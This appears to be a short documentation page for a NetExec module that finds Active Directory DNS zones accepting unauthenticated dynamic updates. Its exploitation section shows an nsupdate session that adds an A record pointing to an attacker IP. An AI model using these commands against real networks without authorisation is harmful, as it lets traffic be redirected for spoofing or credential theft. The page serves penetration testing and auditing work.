# 🆕 Enumerate Unsecure DNS Zones

This module enumerates DNS zones that are configured with the `Nonsecure and secure` setting for dynamic updates. This misconfiguration allows **unauthenticated users** to add DNS records and, in some cases, delete or modify existing records.

```bash
nxc smb $DC_IP -u $USER -p $PASSWORD -M dns-nonsecure
```

## Exploitation

If you find misconfigured zones, you can interact with dynamic updates through `nsupdate`. Here is an example of adding an **A record** that points to the attacker machine:

```bash
nsupdate
> server $TARGET
> zone $ZONE
> update add $RECORD.$ZONE 0 A $ATTACKER_IP
> show
> send
```

<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
